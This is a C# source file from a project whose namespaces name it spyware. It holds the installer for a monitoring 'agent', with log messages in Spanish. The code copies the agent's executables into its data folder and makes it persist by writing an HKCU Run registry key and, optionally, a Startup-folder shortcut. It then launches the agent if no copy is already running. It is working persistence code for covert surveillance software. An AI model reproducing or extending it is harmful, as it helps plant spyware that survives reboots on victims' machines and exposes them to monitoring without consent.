using System.Diagnostics;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Persistence;

namespace Spyware.Maintenance;

public sealed record InstallOptions(
    string? ExecutablePath,
    string? ValueNameOverride,
    bool CopyBinaries,
    bool StartupFolder,
    bool StartProcess);

public static class Installer
{
    public static int Install(AgentPaths paths, AgentConfig config, ILog log, InstallOptions options)
    {
        paths.EnsureDirectories();

        string executable = ResolveExecutable(paths, log, options);
        string valueName = string.IsNullOrWhiteSpace(options.ValueNameOverride)
            ? config.Persistence.RegistryValueName
            : options.ValueNameOverride!;

        if (options.CopyBinaries)
            log.Info("Ejecutable usado para persistencia: " + executable);

        var registry = new RegistryRunInstaller();

        if (config.Persistence.Enabled)
        {
            registry.Install(valueName, executable, log);

            if (registry.IsInstalled(valueName, executable))
                Console.WriteLine($"[ok] Run key instalada: HKCU\\{RegistryRunInstaller.RunKeyPath}\\{valueName}");
        }
        else
        {
            Console.WriteLine("[i] persistence.enabled = false: no se escribe la Run key.");
        }

        var startup = new StartupFolderInstaller();
        bool useStartup = options.StartupFolder || config.Persistence.StartupFolder;

        if (useStartup)
        {
            startup.Install(valueName, executable, log);
            Console.WriteLine("[ok] Acceso directo en la carpeta de Inicio.");
        }

        ConfigLoader.Save(paths, config, log);
        Console.WriteLine("[ok] Datos del agente en: " + paths.RootDirectory);

        if (options.StartProcess && !Core.Runtime.SingleInstanceGuard.IsAgentRunning(config.MutexSeed))
        {
            try
            {
                Process.Start(new ProcessStartInfo(executable)
                {
                    UseShellExecute = true,
                    WorkingDirectory = Path.GetDirectoryName(executable)
                });

                Console.WriteLine("[ok] Proceso del agente iniciado.");
            }
            catch (Exception ex)
            {
                log.Error("No se pudo iniciar el agente tras instalar.", ex);
                Console.WriteLine("[!!] No se pudo iniciar el agente: " + ex.Message);
            }
        }

        return 0;
    }

    private static string ResolveExecutable(AgentPaths paths, ILog log, InstallOptions options)
    {
        string candidate = string.IsNullOrWhiteSpace(options.ExecutablePath)
            ? Core.Runtime.ProcessContext.ExecutablePath
            : Environment.ExpandEnvironmentVariables(options.ExecutablePath!.Trim());

        if (!File.Exists(candidate))
            throw new FileNotFoundException("El ejecutable indicado no existe.", candidate);

        bool alreadyInDataDirectory =
            Path.GetDirectoryName(candidate)!
                .StartsWith(paths.RootDirectory, StringComparison.OrdinalIgnoreCase);

        if (options.CopyBinaries && !alreadyInDataDirectory)
        {
            string binaryDirectory = Path.Combine(paths.RootDirectory, "bin");
            CopyBinaries(Path.GetDirectoryName(candidate)!, binaryDirectory, log);
            return Path.Combine(binaryDirectory, Path.GetFileName(candidate));
        }

        return candidate;
    }

    private static void CopyBinaries(string sourceDirectory, string targetDirectory, ILog log)
    {
        Directory.CreateDirectory(targetDirectory);

        foreach (string file in Directory.EnumerateFiles(sourceDirectory, "*"))
        {
            string extension = Path.GetExtension(file).ToLowerInvariant();
            if (extension is not (".exe" or ".dll" or ".json" or ".config" or ".runtimeconfig.json"))
                continue;

            try { File.Copy(file, Path.Combine(targetDirectory, Path.GetFileName(file)), overwrite: true); }
            catch (IOException ex) { log.Debug("Salto de archivo en copia: " + ex.Message); }
        }
    }
}
